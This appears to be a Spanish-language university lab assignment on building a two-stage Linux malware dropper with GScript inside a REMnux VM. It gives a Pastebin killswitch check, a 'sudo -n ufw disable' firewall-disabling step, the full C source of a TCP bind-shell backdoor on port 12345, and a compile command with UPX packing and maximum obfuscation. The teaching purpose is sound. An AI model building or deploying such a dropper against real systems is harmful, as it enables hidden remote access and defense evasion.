# Práctica 4: dropper

## Objetivo
Tienes que realizar esta práctica en una máquina virtual de REMnux.  Si todavía no tienes ninguna preparada, puedes descargar la OVA para Virtual Box de esta página:

https://docs.remnux.org/install-distro/get-virtual-appliance

En este ejercicio crearemos un dropper con dos etapas usando GScript.

El objetivo es crear un binario malicioso para Linux que esté comprimido con UPX y ofuscado al máximo nivel (0) que complete tres etapas:

    A) Comprobar si hay un killswitch activado. Si lo está, no debe hacer nada.

    B) Intentar elevar privilegios con sudo para desactivar el firewall de Ubuntu.

    C) Ejecutar un payload que es una puerta trasera TCP.


## Instalación de GScript


Lo más cómodo es instalar el contenedor Docker. Instala Docker en tu máquina virtual (si no está instalado). Después, como root:

    docker pull gen0cide/gscript:v1


Crea un directorio en tu máquina virtual para intercambiar ficheros con el contenedor. Suponiendo que tienes el path absoluto del directorio en la variable de entorno $dir, puedes  ejecutar el contenedor así:

    docker run -it -v $dir:/root/share gen0cide/gscript:v1

## GScripts

Todos los gscripts tienen que ir escribiendo mensajes de logging informando de los pasos que van ejecutando.

Para cada fase se debe crear un gscript diferente. Se deben ajustar las prioridades para ejecutar en el orden establecido.

### A) killswitch.gs

Este gscript se basa en comprobar si existe una página de Pastebin, que debes crear tú. Cuando exista dicha página y el contenido sea "OFF",  el fichero malicioso no ejecuta nada más. En otro caso, sigue ejecutando las siguientes fases.

Para conseguir el contenido en crudo del pastebin, usa la URL:

https://pastebin.com/raw/

Puedes ver este ejemplo:

https://github.com/ahhh/gscripts/blob/master/attack/multi/requests/requests_example.gs

Si no tienes cuenta en pastebin para modificar, puedes crear dos pastebins diferentes para probar si funciona el killswitch. Para entregar la práctica, deja puesto en el código el pastebin que activa el ataque para que los profesores puedan probarlo.

### B) fwdown.gs

El gscript debe intentar ejecutar el comando

sudo -n ufw disable

para desactivar el firewall de Ubuntu. La opción -n de sudo hace que no se pida contraseña, y se puede usar para evitar el bloqueo de esta fase.


Este gscript tiene tener un timeout de 10 segundos.


Puedes ver este ejemplo:

https://github.com/ahhh/gscripts/blob/master/attack/linux/disable_firewall.gs


### C) payload.gs

Este gscript debe ejecutar el payload, que es la puerta trasera básica:
```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
// for simplicity we omit some error checks
int
main(int argc,  char **argv){
        int new, sockfd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in sin;
        int i;
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = 0;
        sin.sin_port = htons(12345);
        if(bind(sockfd, (struct sockaddr *)&sin, sizeof(sin)) < 0)
                return 1;
        if(listen(sockfd, 5) < 0)
                return 1;
        new = accept(sockfd, NULL, 0);
        for(i = 2; i >= 0; i--)
                dup2(new, i);
        execl("/bin/sh", "sh", NULL);
}
```

El payload se tiene que soltar en el directorio /tmp con un nombre aleatorio.

Puedes ver este ejemplo:

https://github.com/ahhh/gscripts/blob/master/attack/linux/merlin_example.gs

## Entrega

Hay que entregar un fichero tgz con los tres gscripts y el fichero con el payload en un directorio dropper, todo listo para crear el fichero malicioso con las siguientes líneas:

$ tar xvzf dropper.tgz  
$ cd dropper  
$ gscript compile --enable-logging --enable-upx-compression --obfuscation-level 0 -o $(pwd)/evil killswitch.gs fwdown.gs payload.gs  

Los profesores tienen que poder generar el binario malicioso ejecutando estas tres líneas en una shell. Ten cuidado con las rutas de los ficheros.
